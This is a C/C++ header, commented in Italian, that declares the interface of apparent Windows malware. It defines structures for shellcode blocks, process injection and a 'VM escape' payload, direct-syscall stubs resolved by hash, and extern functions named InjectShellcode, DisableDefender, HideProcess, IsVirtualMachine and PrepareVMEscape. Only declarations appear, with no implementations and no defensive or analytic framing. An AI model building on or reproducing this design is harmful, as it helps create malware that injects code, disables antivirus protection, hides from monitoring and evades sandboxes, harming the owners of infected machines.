#pragma once

#include <windows.h>
#include <winternl.h>

// Definizioni delle strutture NT non esposte
typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef VOID (NTAPI *PIO_APC_ROUTINE)(
    IN PVOID ApcContext,
    IN PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG Reserved
);

// Definizioni per le syscall
typedef NTSTATUS(NTAPI* PNtCreateFile)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
);

typedef NTSTATUS(NTAPI* PNtWriteFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID Buffer,
    ULONG Length,
    PLARGE_INTEGER ByteOffset,
    PULONG Key
);

// Strutture per lo shellcode
#pragma pack(push, 1)
typedef struct _SHELLCODE_BLOCK {
    BYTE* Code;
    SIZE_T Size;
    DWORD Protection;
    DWORD Flags;
    PVOID Context;
} SHELLCODE_BLOCK, *PSHELLCODE_BLOCK;

typedef struct _INJECTION_DATA {
    HANDLE ProcessHandle;
    PVOID BaseAddress;
    SIZE_T RegionSize;
    DWORD Protection;
    DWORD AllocationType;
    PVOID Buffer;
} INJECTION_DATA, *PINJECTION_DATA;

// Struttura per il payload di evasione VM
typedef struct _VM_ESCAPE_PAYLOAD {
    DWORD PayloadSize;
    BYTE* PayloadData;
    DWORD TargetFlags;
    PVOID HostContext;
    BOOLEAN IsVirtualized;
} VM_ESCAPE_PAYLOAD, *PVM_ESCAPE_PAYLOAD;

// Funzioni di utilità
typedef struct _SYSCALL_ENTRY {
    DWORD Hash;
    DWORD Number;
    PVOID Address;
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

#pragma pack(pop)

// Funzioni esportate dall'assembly
extern "C" {
    NTSTATUS NtCreateFileStub();
    NTSTATUS NtWriteFileStub();
    NTSTATUS NtProtectVirtualMemoryStub();
    void InjectShellcode(BYTE* shellcode, SIZE_T size);
    void DisableDefender();
    
    // Nuove funzioni
    BOOL IsVirtualMachine();
    NTSTATUS PrepareVMEscape(PVM_ESCAPE_PAYLOAD Payload);
    NTSTATUS HideProcess(HANDLE ProcessHandle);
    DWORD GetSyscallNumber(DWORD FunctionHash);
    PVOID GetSyscallAddress(DWORD SyscallNumber);
}
